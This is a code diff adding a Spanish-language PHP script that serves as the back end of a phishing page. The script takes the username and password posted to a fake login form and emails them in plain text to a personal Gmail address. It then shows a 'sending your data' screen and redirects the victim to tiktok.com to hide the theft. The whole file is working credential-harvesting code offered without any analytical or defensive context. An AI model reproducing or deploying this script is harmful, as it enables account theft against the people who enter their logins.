@@ -1,0 +1,54 @@
+<?php
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    $destinatario = "gerar.amaya34@gmail.com";
+    $asunto = "Nuevo formulario de login enviado";
+
+    $usuario = htmlspecialchars($_POST['username'] ?? '');
+    $clave = htmlspecialchars($_POST['password'] ?? '');
+
+    $mensaje = "Usuario: $usuario\n";
+    $mensaje .= "Contraseña: $clave\n";
+
+    $headers = "From: formulario@tuweb.com\r\n";
+    $headers .= "Reply-To: no-reply@tuweb.com\r\n";
+
+    if (mail($destinatario, $asunto, $mensaje, $headers)) {
+        // Mostrar pantalla de carga y redirigir con JavaScript
+        echo <<<HTML
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>Enviando...</title>
+    <meta http-equiv="refresh" content="3;url=https://www.tiktok.com">
+    <style>
+        body {
+            background-color: #121212;
+            color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-family: Arial, sans-serif;
+            text-align: center;
+        }
+        .mensaje {
+            font-size: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="mensaje">
+        <p>Enviando tus datos... serás redirigido en unos segundos.</p>
+        <p>Gracias por tu paciencia.</p>
+    </div>
+</body>
+</html>
+HTML;
+        exit;
+    } else {
+        echo "Error al enviar el formulario.";
+    }
+} else {
+    echo "Acceso no permitido.";
+}
